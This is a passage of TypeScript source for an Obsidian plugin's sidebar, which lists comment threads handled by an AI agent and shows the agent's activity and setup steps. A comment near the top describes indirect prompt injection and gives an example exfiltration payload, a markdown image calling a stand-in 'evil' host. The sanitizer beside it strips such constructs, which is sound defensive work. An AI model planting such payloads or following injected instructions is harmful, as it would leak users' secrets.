import {
  ItemView,
  MarkdownRenderer,
  MarkdownView,
  WorkspaceLeaf,
  TFile,
  Notice,
} from "obsidian";
import type { EditorView } from "@codemirror/view";
import { remapRenamedPath } from "sheaf-server/types";
import type SheafPlugin from "../main";
import type { Thread, ThreadDraftBody } from "../sheaf-client";
import { flashRange } from "../editor/flash";
import {
  REVIEW_AUTHOR_PREFIX,
  isPanelRequest,
  prettyPersona,
  reviewPersonaId,
} from "../review";
import { ACP_AGENTS, ACP_EFFORTS, type AcpEffort } from "../acp/registry";
import type { ActivitySnapshot } from "../acp/activity-store";

export const VIEW_TYPE_SHEAF_THREADS = "sheaf-threads";

/**
 * "Working" = thread is open AND the latest message is not from the user.
 * The agent's convention (per the MCP ReadMe) is to ReplyThread when it
 * picks up a thread, then Edit/Write, then ResolveThread — so any non-user
 * message on an open thread means the agent has it.
 */
function isWorking(thread: Thread): boolean {
  if (thread.status !== "open") return false;
  const last = thread.messages[thread.messages.length - 1];
  return !!last && last.author !== "user";
}

/**
 * Option leaves to render as a picker — but only while they're the *latest*
 * word on the thread. Once anyone posts after them (e.g. the user's "Selected
 * option N" pick, routed back to the agent), the picker hides: the ball is in
 * the agent's court now, and a lingering picker would invite a double-pick.
 * A single-leaf `draft` payload is treated as a one-element option list.
 */
function latestVariants(thread: Thread): ThreadDraftBody[] | null {
  const m = thread.messages[thread.messages.length - 1];
  if (!m) return null;
  if (m.draft_options && m.draft_options.length > 0) return m.draft_options;
  if (m.draft) return [m.draft];
  return null;
}

/**
 * Drift = thread is range-anchored but its anchored_text isn't found in the
 * current doc text. Anchor needs re-resolution or the thread is stale.
 */
function isDrifted(thread: Thread, docText: string | null): boolean {
  if (docText === null) return false;
  const target = thread.targets[0];
  if (target?.scope !== "range") return false;
  const anchored = target.anchor.anchored_text;
  if (!anchored) return false;
  return !docText.includes(anchored);
}

/**
 * Thread bodies are agent- or user-authored, and the agent can be steered by
 * any doc it reads (indirect prompt injection). Rendering them as full markdown
 * would auto-fetch image/embed URLs on render — a silent exfiltration channel
 * (e.g. `![](https://evil/?d=secrets)`). Neutralize the network-fetching
 * constructs before rendering; formatting (bold, lists, code, headings, links)
 * still renders, and links require an explicit click. This restores the
 * no-auto-fetch property the previous plain-text rendering relied on.
 */
function stripAutoFetch(md: string): string {
  return md
    // Markdown image -> its alt text (no <img>, no fetch).
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
    // Obsidian embed ![[...]] -> a plain wikilink [[...]] (link, not an embed).
    .replace(/!(?=\[\[)/g, "")
    // Raw HTML tags that fetch/execute on render.
    .replace(
      /<\s*(img|iframe|embed|object|video|audio|source|link|script)\b[^>]*>/gi,
      "",
    )
    .replace(/<\/\s*(iframe|object|video|audio|script)\s*>/gi, "");
}

export class ThreadsView extends ItemView {
  private currentDocPath: string | null = null;
  private currentFile: TFile | null = null;
  private docText: string | null = null;
  private threads: Thread[] = [];
  private agentConnected = false;
  private activityEl: HTMLElement | null = null;
  private storeUnsub: (() => void) | null = null;
  private activityRenderQueued = false;
  // Per-thread selected variant index. Resets when the thread's payload changes.
  private selectedVariant = new Map<string, number>();
  // Per-thread pending reply text. The panel re-renders wholesale on every
  // backend event, variant-tab toggle, collapse, and editor keystroke (the
  // vault "modify" handler). The reply <textarea>'s only state is its live DOM
  // value, so without stashing it here a re-render recreates the box empty and
  // silently drops whatever the user had typed. Keyed by thread id; cleared on
  // successful send and on file switch.
  private replyDrafts = new Map<string, string>();
  // Resolved section starts collapsed each session so the panel reads as
  // "what's outstanding" by default.
  private resolvedCollapsed = true;
  // Server reachability, for the connect panel: null = unknown/not yet pinged.
  // Distinguishes "server down" from "server up but no agent listening".
  private serverUp: boolean | null = null;
  private pinging = false;
  private lastPing = 0;
  // Per-thread collapse state (thread ids that are collapsed to a one-liner).
  // Instance-held so it survives the full re-render on every backend event.
  private collapsed = new Set<string>();

  rerender(): void {
    this.render();
  }

  /**
   * Scroll the markdown editor showing `this.currentFile` to the thread's
   * anchor and flash it. Range threads: search for `anchored_text` in the
   * current doc. Doc threads: scroll to the top. Drifted threads: notice.
   *
   * Looks up the editor by file rather than by `getActiveViewOfType` — the
   * click that triggered this navigation moves focus into the sidebar, so
   * the active view is the threads panel, not the editor.
   */
  private navigateToAnchor(thread: Thread): void {
    if (!this.currentFile) return;
    let mdView: MarkdownView | null = null;
    this.app.workspace.iterateAllLeaves((leaf) => {
      const v = leaf.view;
      if (v instanceof MarkdownView && v.file === this.currentFile) {
        mdView = v;
      }
    });
    if (!mdView) return;
    const editor = (mdView as MarkdownView).editor;
    const target = thread.targets[0];
    if (!target) return;

    if (target.scope === "doc") {
      const top = { line: 0, ch: 0 };
      editor.scrollIntoView({ from: top, to: top }, true);
      editor.setCursor(top);
      editor.focus();
      return;
    }

    const docText = editor.getValue();
    const anchored = target.anchor.anchored_text;
    if (!anchored) return;
    const idx = docText.indexOf(anchored);
    if (idx === -1) {
      new Notice("Anchor drifted — text not in doc", 4000);
      return;
    }
    const to = idx + anchored.length;
    const fromPos = editor.offsetToPos(idx);
    const toPos = editor.offsetToPos(to);
    editor.scrollIntoView({ from: fromPos, to: toPos }, true);
    editor.focus();
    // Flash the anchored text rather than hard-selecting it: a non-destructive
    // cue that doesn't clobber the user's place. `cm` is the underlying CM6
    // EditorView (not in Obsidian's public typings). Obsidian editor offsets
    // are CM6 document offsets, so `idx`/`to` map straight through.
    const cm = (editor as unknown as { cm?: EditorView }).cm;
    if (cm) flashRange(cm, idx, to);
  }

  constructor(
    leaf: WorkspaceLeaf,
    private plugin: SheafPlugin,
  ) {
    super(leaf);
  }

  getViewType(): string {
    return VIEW_TYPE_SHEAF_THREADS;
  }

  getDisplayText(): string {
    return "Sheaf threads";
  }

  getIcon(): string {
    return "message-square";
  }

  async onOpen(): Promise<void> {
    this.contentEl.empty();
    this.contentEl.addClass("sheaf-threads-view");
    // Combined presence (manual MCP *or* a spawned ACP agent) — reading the
    // raw SSE-only flag here showed "no agent" even with an ACP agent live.
    this.agentConnected = this.plugin.isAgentPresent();
    this.registerEvent(
      this.app.workspace.on("file-open", (file) => {
        void this.onFileOpen(file);
      }),
    );
    this.registerEvent(
      this.app.vault.on("modify", (file) => {
        if (file instanceof TFile && file === this.currentFile) {
          void this.refreshDocText();
        }
      }),
    );
    // Live agent-activity: re-render the activity subtree on store changes
    // (debounced — message/thought chunks can burst) and tick while a turn is
    // active so the elapsed/stalled hint stays current.
    this.storeUnsub = this.plugin
      .acpActivity()
      .subscribe(() => this.scheduleActivityRender());
    this.registerInterval(window.setInterval(() => this.tickActivity(), 2000));

    const active = this.app.workspace.getActiveFile();
    if (active) void this.onFileOpen(active);
  }

  async onClose(): Promise<void> {
    this.storeUnsub?.();
    this.storeUnsub = null;
    this.activityEl = null;
    this.contentEl.empty();
  }

  setAgentPresence(connected: boolean): void {
    this.agentConnected = connected;
    this.render();
  }

  private scheduleActivityRender(): void {
    if (this.activityRenderQueued) return;
    this.activityRenderQueued = true;
    window.setTimeout(() => {
      this.activityRenderQueued = false;
      this.renderActivity();
    }, 120);
  }

  /** Keep the elapsed/stalled hint fresh while a turn is in flight. */
  private tickActivity(): void {
    if (!this.currentDocPath) return;
    const snap = this.plugin.acpActivity().snapshot(this.currentDocPath);
    if (snap && snap.state !== "idle" && snap.state !== "dead") {
      this.renderActivity();
    }
  }

  /** Patch the activity subtree in place from the current doc's snapshot. */
  private renderActivity(): void {
    const el = this.activityEl;
    if (!el || !el.isConnected) return;
    el.empty();
    const docPath = this.currentDocPath;
    if (!docPath) return;
    const snap = this.plugin.acpActivity().snapshot(docPath);
    if (!snap) return;
    // Nothing worth showing for an untouched/idle doc.
    if (
      snap.state === "idle" &&
      snap.plan.length === 0 &&
      snap.toolCalls.length === 0 &&
      !snap.stopReason
    ) {
      return;
    }

    el.style.padding = "0.5em";
    el.style.borderBottom = "1px solid var(--background-modifier-border)";
    el.style.fontSize = "0.85em";

    const statusRow = el.createDiv();
    statusRow.style.display = "flex";
    statusRow.style.alignItems = "center";
    statusRow.style.justifyContent = "space-between";
    statusRow.style.gap = "0.5em";

    const { text, color } = this.describeActivity(snap);
    const label = statusRow.createDiv();
    label.setText(text);
    label.style.color = color;
    label.style.fontWeight = "500";

    if (
      snap.state === "working" ||
      snap.state === "thinking" ||
      snap.state === "stalled"
    ) {
      const stop = statusRow.createEl("button", { text: "Stop" });
      stop.style.fontSize = "0.8em";
      stop.style.flexShrink = "0";
      stop.title = "Cancel the agent's current turn";
      stop.addEventListener("click", () =>
        this.plugin.cancelAgentTurn(docPath),
      );
    }

    if (snap.plan.length > 0) {
      const planEl = el.createDiv();
      planEl.style.marginTop = "0.4em";
      for (const p of snap.plan) {
        const row = planEl.createDiv();
        const mark =
          p.status === "completed"
            ? "☑"
            : p.status === "in_progress"
              ? "◐"
              : "☐";
        row.setText(`${mark} ${p.content}`); // setText = plain text (injection-safe)
        row.style.opacity = p.status === "completed" ? "0.6" : "1";
        if (p.status === "in_progress") row.style.fontWeight = "500";
      }
    }

    if (snap.toolCalls.length > 0) {
      const toolsEl = el.createDiv();
      toolsEl.style.marginTop = "0.4em";
      toolsEl.style.opacity = "0.85";
      // Last few — a full timeline is the maximalist view.
      for (const t of snap.toolCalls.slice(-6)) {
        const row = toolsEl.createDiv();
        const icon =
          t.status === "completed"
            ? "✓"
            : t.status === "failed"
              ? "✗"
              : t.status === "in_progress"
                ? "⟳"
                : "·";
        row.setText(`${icon} ${t.title}`);
        if (t.status === "failed") row.style.color = "var(--text-error)";
      }
    }
  }

  private describeActivity(snap: ActivitySnapshot): {
    text: string;
    color: string;
  } {
    const secs = Math.round(
      (snap.state === "stalled" ? snap.quietMs : snap.elapsedMs) / 1000,
    );
    switch (snap.state) {
      case "thinking":
        return { text: `Thinking… (${secs}s)`, color: "var(--text-muted)" };
      case "working":
        return {
          text: `⟳ ${snap.currentTool ?? "Working"}… (${secs}s)`,
          color: "var(--text-normal)",
        };
      case "waiting":
        return {
          text: "⏸ Waiting for your input",
          color: "var(--text-warning)",
        };
      case "stalled":
        return {
          text: `⚠ Possibly stuck — quiet for ${secs}s`,
          color: "var(--text-warning)",
        };
      case "dead":
        return {
          text: `✗ Agent crashed${snap.dead ? `: ${snap.dead}` : ""}`,
          color: "var(--text-error)",
        };
      default: // idle
        return {
          text:
            snap.stopReason && snap.stopReason !== "end_turn"
              ? `■ Stopped (${snap.stopReason})`
              : "✓ Done",
          color: "var(--text-muted)",
        };
    }
  }

  async refreshCurrent(): Promise<void> {
    if (!this.currentDocPath) return;
    try {
      this.threads = await this.plugin.client.listThreads(this.currentDocPath);
      this.render();
    } catch (err) {
      console.error("sheaf: list threads failed", err);
    }
  }

  async onThreadChanged(threadId: string, targetPaths: string[]): Promise<void> {
    if (!this.currentDocPath) return;
    if (!targetPaths.includes(this.currentDocPath)) return;
    await this.refreshCurrent();
  }

  /**
   * Follow a rename of the open doc — directly, or via a renamed ancestor
   * folder (`from`/`to` are then the folder paths, and `remapRenamedPath`
   * rewrites the descendant). Obsidian mutates the open `TFile`'s `path` in
   * place (and fires no `file-open`), so `currentFile` still points at the
   * right editor — only `currentDocPath`, captured as a string, has gone stale.
   * Repoint it and refetch so the panel keeps showing the doc's threads (which
   * the server has just moved) instead of going blank.
   */
  onDocRenamed(from: string, to: string): void {
    if (!this.currentDocPath) return;
    const next = remapRenamedPath(this.currentDocPath, from, to);
    if (next === null) return;
    this.currentDocPath = next;
    void this.refreshCurrent();
  }

  private async onFileOpen(file: TFile | null): Promise<void> {
    this.currentFile = file;
    this.currentDocPath = file ? this.plugin.vaultPathToSheafPath(file.path) : null;
    this.threads = [];
    this.docText = null;
    this.selectedVariant.clear();
    this.replyDrafts.clear();
    this.render();
    if (this.currentFile) {
      await this.refreshDocText();
    }
    if (this.currentDocPath) {
      await this.refreshCurrent();
    }
  }

  private async refreshDocText(): Promise<void> {
    if (!this.currentFile) return;
    try {
      this.docText = await this.app.vault.cachedRead(this.currentFile);
      this.render();
    } catch (err) {
      console.error("sheaf: read file failed", err);
    }
  }

  private render(): void {
    const el = this.contentEl;
    el.empty();

    const header = el.createDiv({ cls: "sheaf-threads-header" });
    header.style.padding = "0.5em";
    header.style.borderBottom = "1px solid var(--background-modifier-border)";

    const presenceRow = header.createDiv();
    presenceRow.style.display = "flex";
    presenceRow.style.alignItems = "center";
    presenceRow.style.justifyContent = "space-between";
    presenceRow.style.gap = "0.5em";

    const presence = presenceRow.createDiv();
    presence.setText(
      this.agentConnected ? "● agent connected" : "○ no agent listening",
    );
    presence.style.fontSize = "0.85em";
    presence.style.opacity = this.agentConnected ? "1" : "0.6";
    presence.style.color = this.agentConnected
      ? "var(--text-success)"
      : "var(--text-muted)";

    // Connect/disconnect the plugin-managed ACP agent. Labelled by ACP state
    // specifically (not the combined presence) — it only controls the
    // subprocess the plugin spawns, not a manually-attached MCP agent.
    const acpConnected = this.plugin.acpConnected();
    const acpBtn = presenceRow.createEl("button", {
      text: acpConnected ? "Disconnect" : "Connect agent",
    });
    acpBtn.style.fontSize = "0.8em";
    acpBtn.style.flexShrink = "0";
    acpBtn.title = acpConnected
      ? "Stop the ACP agent the plugin started"
      : "Start the configured ACP agent (Settings → Sheaf → ACP agent)";
    acpBtn.addEventListener("click", () => {
      if (this.plugin.acpConnected()) {
        this.plugin.disconnectAcp();
      } else {
        acpBtn.disabled = true;
        acpBtn.setText("Connecting…");
        // Re-renders via onConnectionChange on success/failure.
        void this.plugin.connectAcp();
      }
    });

    // Agent + effort selectors. They configure the *next* connect, so they're
    // disabled while an agent is live (disconnect to change, then reconnect).
    const acpLive = this.plugin.acpConnected();
    const configRow = header.createDiv();
    configRow.style.display = "flex";
    configRow.style.gap = "0.5em";
    configRow.style.marginTop = "0.4em";
    configRow.style.fontSize = "0.8em";

    const agentSel = configRow.createEl("select");
    agentSel.title = "Which ACP agent to spawn";
    agentSel.disabled = acpLive;
    for (const a of ACP_AGENTS) {
      const opt = agentSel.createEl("option", { text: a.displayName });
      opt.value = a.id;
      if (a.id === this.plugin.settings.acpAgentId) opt.selected = true;
    }
    agentSel.addEventListener("change", () => {
      this.plugin.settings.acpAgentId = agentSel.value;
      void this.plugin.saveSettings();
    });

    const effortSel = configRow.createEl("select");
    effortSel.title = "Reasoning effort passed to the agent on connect";
    effortSel.disabled = acpLive;
    for (const e of ACP_EFFORTS) {
      const opt = effortSel.createEl("option", { text: `Effort: ${e}` });
      opt.value = e;
      if (e === this.plugin.settings.acpEffort) opt.selected = true;
    }
    effortSel.addEventListener("change", () => {
      this.plugin.settings.acpEffort = effortSel.value as AcpEffort;
      void this.plugin.saveSettings();
    });

    // Live agent activity for the current doc (plan, current step, state, stop
    // reason, Stop button). Its own node so store updates patch it in place
    // without a full panel re-render.
    this.activityEl = el.createDiv();
    this.renderActivity();

    // No agent listening → show how to connect one (or how to start the
    // server, if it's the server that's down). Shown regardless of whether a
    // doc is open, since it's about the agent connection, not the doc.
    if (!this.agentConnected) {
      this.renderConnectPanel(el);
    }

    if (!this.currentDocPath) {
      const empty = el.createDiv({ cls: "sheaf-empty" });
      empty.setText("Open a markdown doc to see its threads.");
      empty.style.padding = "1em";
      empty.style.opacity = "0.6";
      return;
    }

    const docPath = this.currentDocPath;

    const docLabel = header.createDiv();
    docLabel.setText(docPath);
    docLabel.style.fontSize = "0.75em";
    docLabel.style.opacity = "0.5";
    docLabel.style.marginTop = "0.25em";

    // Panel actions: start a new thread on this doc, or request a panel review.
    // These mirror the editor context-menu items so the work is reachable from
    // the panel without round-tripping to the editor.
    const headerActions = header.createDiv();
    headerActions.style.display = "flex";
    headerActions.style.gap = "0.5em";
    headerActions.style.marginTop = "0.5em";

    const newThreadBtn = headerActions.createEl("button", {
      text: "+ New thread",
    });
    newThreadBtn.style.fontSize = "0.8em";
    newThreadBtn.title =
      "Comment on this doc (anchors to the editor selection if there is one)";
    newThreadBtn.addEventListener("click", () => {
      this.plugin.commentFromPanel(docPath);
    });

    const reviewBtn = headerActions.createEl("button", {
      text: "Request review",
    });
    reviewBtn.style.fontSize = "0.8em";
    reviewBtn.disabled = !this.agentConnected;
    reviewBtn.style.opacity = this.agentConnected ? "1" : "0.5";
    reviewBtn.title = this.agentConnected
      ? "Ask the agent to review this doc as a panel of roles"
      : "Connect an agent to request a review";
    reviewBtn.addEventListener("click", () => {
      this.plugin.openReviewModalForPath(docPath);
    });

    if (this.threads.length === 0) {
      const empty = el.createDiv({ cls: "sheaf-empty" });
      empty.setText(
        'No threads. Select text and run "Sheaf: Comment for agent" (Cmd/Ctrl+Shift+M).',
      );
      empty.style.padding = "1em";
      empty.style.opacity = "0.6";
      return;
    }

    const open = this.threads.filter((t) => t.status === "open");
    const closed = this.threads.filter((t) => t.status !== "open");

    if (open.length > 0) {
      const section = el.createDiv();
      const h = section.createEl("h4", { text: `Open (${open.length})` });
      h.style.margin = "0.75em 0.5em 0.25em";
      for (const t of open) this.renderThread(section, t);
    }

    // Resolved section. Hidden entirely when settings.showResolved is off;
    // otherwise collapsible behind a ▶/▼ toggle that defaults to collapsed.
    if (this.plugin.settings.showResolved && closed.length > 0) {
      const section = el.createDiv();
      const h = section.createEl("h4");
      h.style.margin = "0.75em 0.5em 0.25em";
      h.style.cursor = "pointer";
      h.style.userSelect = "none";
      h.style.display = "flex";
      h.style.alignItems = "center";
      h.style.gap = "0.4em";

      const caret = h.createSpan();
      caret.setText(this.resolvedCollapsed ? "▶" : "▼");
      caret.style.fontSize = "0.7em";
      caret.style.opacity = "0.6";

      const label = h.createSpan();
      label.setText(`Resolved (${closed.length})`);
      label.style.opacity = "0.7";

      h.addEventListener("click", () => {
        this.resolvedCollapsed = !this.resolvedCollapsed;
        this.render();
      });

      if (!this.resolvedCollapsed) {
        const body = section.createDiv();
        body.style.opacity = "0.55";
        for (const t of closed) this.renderThread(body, t);
      }
    }
  }

  /**
   * Ping the server (debounced) and re-render if reachability changed. Lets the
   * connect panel tell "server down" apart from "server up, no agent".
   */
  private checkServer(): void {
    // Throttle: render() runs on every keystroke (vault "modify"), and this is
    // called from the connect panel each render. Without a time gate that would
    // be a continuous stream of pings while typing with no agent connected.
    const now = Date.now();
    if (this.pinging || now - this.lastPing < 4000) return;
    this.pinging = true;
    this.lastPing = now;
    void this.plugin.client.ping().then((up) => {
      this.pinging = false;
      if (up !== this.serverUp) {
        this.serverUp = up;
        this.render();
      }
    });
  }

  /**
   * Connect panel shown when no agent is listening. Two states:
   *  - server unreachable → how to get the server running.
   *  - server up (or unknown) → the one-liner to attach an agent, copy-ready.
   */
  private renderConnectPanel(parent: HTMLElement): void {
    // Kick a reachability check (no-op if one is in flight); result re-renders.
    this.checkServer();

    const url = this.plugin.settings.serverUrl.replace(/\/$/, "");
    const panel = parent.createDiv();
    panel.style.margin = "0.5em";
    panel.style.padding = "0.6em 0.7em";
    panel.style.border = "1px solid var(--background-modifier-border)";
    panel.style.borderRadius = "6px";
    panel.style.background = "var(--background-secondary)";
    panel.style.fontSize = "0.85em";

    if (this.serverUp === false) {
      const title = panel.createDiv();
      title.setText("⚠ sheaf server not reachable");
      title.style.fontWeight = "600";
      title.style.marginBottom = "0.3em";

      const body = panel.createDiv();
      body.style.opacity = "0.8";
      body.setText(
        this.plugin.settings.runServer
          ? `The embedded server should be running at ${url}. Check the developer console for a bind error (e.g. the port is already in use), or change the port in Sheaf settings.`
          : `Nothing is serving ${url}. Turn on "Run sheaf server inside Obsidian" in Sheaf settings, or start your own server there.`,
      );
      return;
    }

    const title = panel.createDiv();
    title.setText("No agent connected");
    title.style.fontWeight = "600";
    title.style.marginBottom = "0.3em";

    const lead = panel.createDiv();
    lead.style.opacity = "0.8";
    lead.style.marginBottom = "0.5em";
    lead.setText("In a terminal, register the MCP server, then run the agent:");

    this.renderCommandRow(
      panel,
      `claude mcp add --transport http sheaf ${url}/api/mcp`,
    );

    const then = panel.createDiv();
    then.style.opacity = "0.8";
    then.style.margin = "0.5em 0 0.3em";
    then.setText("Run claude, then paste this to put it to work:");

    this.renderCommandRow(
      panel,
      "use the sheaf MCP and watch for events; action and resolve each thread as it appears, and keep handling new ones until I stop you",
    );
  }

  /** A monospace command box with a Copy button. */
  private renderCommandRow(parent: HTMLElement, command: string): void {
    const row = parent.createDiv();
    row.style.display = "flex";
    row.style.gap = "0.4em";
    row.style.alignItems = "stretch";

    const code = row.createEl("code");
    code.setText(command);
    code.style.flex = "1";
    code.style.userSelect = "all";
    code.style.fontSize = "0.8em";
    code.style.padding = "0.35em 0.5em";
    code.style.background = "var(--background-primary)";
    code.style.border = "1px solid var(--background-modifier-border)";
    code.style.borderRadius = "4px";
    code.style.whiteSpace = "pre-wrap";
    code.style.wordBreak = "break-all";

    const copy = row.createEl("button", { text: "Copy" });
    copy.style.fontSize = "0.8em";
    copy.style.flexShrink = "0";
    copy.addEventListener("click", () => {
      void navigator.clipboard.writeText(command).then(
        () => new Notice("Copied"),
        () => new Notice("Copy failed"),
      );
    });
  }

  private renderThread(parent: HTMLElement, thread: Thread): void {
    const card = parent.createDiv({ cls: "sheaf-thread" });
    card.style.padding = "0.5em 0.75em";
    card.style.borderBottom = "1px solid var(--background-modifier-border)";
    card.style.cursor = "pointer";

    // Click anywhere on the card (except buttons/inputs) navigates the
    // editor to the anchor — range threads scroll to the anchored text
    // and flash it; doc threads scroll to the top.
    card.addEventListener("click", (e) => {
      const t = e.target as HTMLElement;
      if (t.closest("button, textarea, input, a")) return;
      this.navigateToAnchor(thread);
    });

    // Collapse toggle: a chevron pinned top-right. Collapsing hides the
    // conversation, drafts, reply box, and actions, leaving the badges + a
    // one-line preview so a busy panel stays scannable.
    card.style.position = "relative";
    const isCollapsed = this.collapsed.has(thread.id);
    const chevron = card.createSpan();
    chevron.setText(isCollapsed ? "▶" : "▼");
    chevron.setAttribute(
      "aria-label",
      isCollapsed ? "expand thread" : "collapse thread",
    );
    chevron.style.position = "absolute";
    chevron.style.top = "0.5em";
    chevron.style.right = "0.6em";
    chevron.style.fontSize = "0.7em";
    chevron.style.opacity = "0.5";
    chevron.style.cursor = "pointer";
    chevron.style.userSelect = "none";
    chevron.addEventListener("click", (e) => {
      e.stopPropagation();
      if (this.collapsed.has(thread.id)) this.collapsed.delete(thread.id);
      else this.collapsed.add(thread.id);
      this.render();
    });

    const drifted = isDrifted(thread, this.docText);

    // Virtual review comment: a thread the agent authored as a `review:<id>`
    // persona. "Parked" = the persona still has the last word, so it's the
    // human's turn to triage — NOT the agent working (the agent only acts once
    // a user message lands; see addressReview / the MCP ReadMe).
    const personaId = reviewPersonaId(thread);
    const lastAuthor =
      thread.messages[thread.messages.length - 1]?.author ?? "";
    // "Parked" only while the comment is fresh: a persona has the last word AND
    // the human hasn't engaged yet. Once the user replies (to discuss or to
    // Address), the thread is in-conversation — it must not flip back to
    // "awaiting your review" / re-offer Address when the agent later answers in
    // the persona's voice.
    const userEngaged = thread.messages.some((m) => m.author === "user");
    const parkedReview =
      personaId !== null &&
      lastAuthor.startsWith(REVIEW_AUTHOR_PREFIX) &&
      !userEngaged;
    const panelReq = isPanelRequest(thread);

    if (personaId !== null) {
      card.style.borderLeft = "3px solid var(--interactive-accent)";
      const badge = card.createDiv();
      badge.setText(`⟁ ${prettyPersona(personaId)} · simulated review`);
      badge.style.fontSize = "0.72em";
      badge.style.textTransform = "uppercase";
      badge.style.letterSpacing = "0.05em";
      badge.style.color = "var(--text-accent)";
      badge.style.marginBottom = "0.4em";
    }

    if (parkedReview) {
      const badge = card.createDiv();
      badge.setText("⟁ awaiting your review");
      badge.style.fontSize = "0.75em";
      badge.style.color = "var(--text-muted)";
      badge.style.marginBottom = "0.4em";
    } else if (isWorking(thread)) {
      const badge = card.createDiv();
      badge.setText("● agent working");
      badge.style.fontSize = "0.75em";
      badge.style.color = "var(--text-accent)";
      badge.style.marginBottom = "0.4em";
    }

    if (drifted) {
      const badge = card.createDiv();
      badge.setText("⚠ anchor drifted");
      badge.style.fontSize = "0.75em";
      badge.style.color = "var(--text-warning)";
      badge.style.marginBottom = "0.4em";
    }

    const target = thread.targets[0];
    if (target?.scope === "range") {
      const anchor = target.anchor.anchored_text;
      if (anchor) {
        const anchorEl = card.createDiv();
        anchorEl.setText(anchor.length > 80 ? anchor.slice(0, 80) + "…" : anchor);
        anchorEl.style.fontStyle = "italic";
        anchorEl.style.opacity = "0.6";
        anchorEl.style.fontSize = "0.85em";
        anchorEl.style.borderLeft = "2px solid var(--text-muted)";
        anchorEl.style.paddingLeft = "0.5em";
        anchorEl.style.marginBottom = "0.5em";
      }
    } else if (target?.scope === "doc") {
      const tag = card.createDiv();
      tag.setText("doc-level");
      tag.style.fontSize = "0.7em";
      tag.style.textTransform = "uppercase";
      tag.style.letterSpacing = "0.05em";
      tag.style.opacity = "0.5";
      tag.style.marginBottom = "0.5em";
    }

    // Collapsed: stop here with a one-line preview of the thread's content.
    if (isCollapsed) {
      const firstBody = panelReq
        ? "Panel review requested"
        : (thread.messages.find((m) => m.body.trim().length > 0)?.body ?? "");
      const oneLine = firstBody.replace(/\s+/g, " ").trim();
      const preview = card.createDiv();
      preview.setText(oneLine.length > 90 ? oneLine.slice(0, 90) + "…" : oneLine);
      preview.style.fontSize = "0.85em";
      preview.style.opacity = "0.7";
      preview.style.whiteSpace = "nowrap";
      preview.style.overflow = "hidden";
      preview.style.textOverflow = "ellipsis";
      preview.style.paddingRight = "1.2em";
      if (thread.messages.length > 1) {
        const more = card.createDiv();
        more.setText(`${thread.messages.length} messages`);
        more.style.fontSize = "0.7em";
        more.style.opacity = "0.45";
        more.style.marginTop = "0.2em";
      }
      return;
    }

    thread.messages.forEach((msg, i) => {
      // The panel-request marker is a machine instruction, not prose — show a
      // friendly label in place of the raw `[sheaf:panel-review] …` body.
      if (panelReq && i === 0) {
        const tag = card.createDiv();
        tag.setText("Panel review requested");
        tag.style.fontWeight = "600";
        tag.style.fontSize = "0.85em";
        tag.style.marginBottom = "0.5em";
        tag.style.opacity = "0.75";
        return;
      }
      const m = card.createDiv();
      m.style.marginBottom = "0.5em";
      const author = m.createDiv({ text: `${msg.author}:` });
      author.style.fontWeight = "600";
      author.style.fontSize = "0.85em";
      // Render the comment body as markdown so lists, code, bold, and links
      // read properly instead of as raw source. `this` is the owning
      // Component so Obsidian cleans up the rendered subtree with the view.
      const body = m.createDiv({ cls: "sheaf-md" });
      body.style.fontSize = "0.9em";
      void MarkdownRenderer.render(
        this.app,
        stripAutoFetch(msg.body),
        body,
        this.currentDocPath ?? "",
        this,
      );
    });

    const variants = latestVariants(thread);
    if (variants && thread.status === "open") {
      this.renderVariants(card, thread, variants);
    }

    if (thread.status === "open") {
      this.renderReplyInput(card, thread);

      const actions = card.createDiv();
      actions.style.marginTop = "0.5em";
      actions.style.display = "flex";
      actions.style.gap = "0.5em";

      // "Address" a parked review comment: the approval gate. Posts a user
      // directive reply so the agent picks the thread up and makes the edit
      // the persona's note calls for. Only meaningful while the persona has
      // the last word (otherwise the conversation is already underway).
      if (parkedReview) {
        const address = actions.createEl("button", { text: "Address" });
        address.style.fontSize = "0.8em";
        address.style.background = "var(--interactive-accent)";
        address.style.color = "var(--text-on-accent)";
        address.addEventListener("click", async () => {
          try {
            await this.plugin.client.addressReview(thread.id);
            new Notice("Asked the agent to address this");
            await this.refreshCurrent();
          } catch (err) {
            console.error("sheaf: address failed", err);
            const msg = err instanceof Error ? err.message : String(err);
            new Notice(`Sheaf: ${msg}`, 8000);
          }
        });
      }

      // "Resolve"/"Dismiss" without applying. Use when the agent already did
      // its work via Edit/Write directly, when dismissing a review comment, or
      // when the user wants to drop without taking any of the variants.
      const resolve = actions.createEl("button", {
        text: personaId !== null ? "Dismiss" : "Resolve",
      });
      resolve.style.fontSize = "0.8em";
      resolve.addEventListener("click", async () => {
        try {
          await this.plugin.client.resolveThread(thread.id);
          new Notice(personaId !== null ? "Review dismissed" : "Thread resolved");
          await this.refreshCurrent();
        } catch (err) {
          console.error("sheaf: resolve failed", err);
          const msg = err instanceof Error ? err.message : String(err);
          new Notice(`Sheaf: ${msg}`, 8000);
        }
      });
    } else {
      const status = card.createDiv();
      status.setText(`✓ ${thread.status}`);
      status.style.fontSize = "0.75em";
      status.style.opacity = "0.5";
      status.style.marginTop = "0.25em";
    }
  }

  private renderReplyInput(parent: HTMLElement, thread: Thread): void {
    const wrap = parent.createDiv();
    wrap.style.marginTop = "0.5em";
    wrap.style.display = "flex";
    wrap.style.gap = "0.4em";
    wrap.style.alignItems = "flex-start";

    const input = wrap.createEl("textarea");
    input.placeholder = "Reply… (Shift+Enter for newline)";
    input.rows = 1;
    input.style.flex = "1";
    input.style.fontSize = "0.85em";
    input.style.padding = "0.3em 0.4em";
    // The box grows and shrinks to fit its content (see autoResize), so disable
    // manual resizing and hide the scrollbar until we hit the cap.
    input.style.resize = "none";
    input.style.overflowY = "hidden";
    input.style.minHeight = "1.8em";
    input.style.border = "1px solid var(--background-modifier-border)";
    input.style.borderRadius = "3px";
    input.style.background = "var(--background-primary)";
    input.style.color = "var(--text-normal)";

    // Auto-expand/contract the textarea to fit its content, capped at maxHeight
    // (beyond which it scrolls). Reset to "auto" first so scrollHeight reflects
    // the content's true height when shrinking, not the previous taller box.
    const maxHeight = 200;
    const autoResize = () => {
      // The panel re-renders wholesale on every backend event, so the deferred
      // rAF below can fire after this textarea has been detached and replaced.
      // Skip the (invisible, wasted) layout pass in that case.
      if (!input.isConnected) return;
      input.style.height = "auto";
      const next = Math.min(input.scrollHeight, maxHeight);
      input.style.height = `${next}px`;
      input.style.overflowY = input.scrollHeight > maxHeight ? "auto" : "hidden";
    };

    // Restore any reply the user had typed before the last re-render, and keep
    // the stash in sync as they type so the next re-render doesn't drop it.
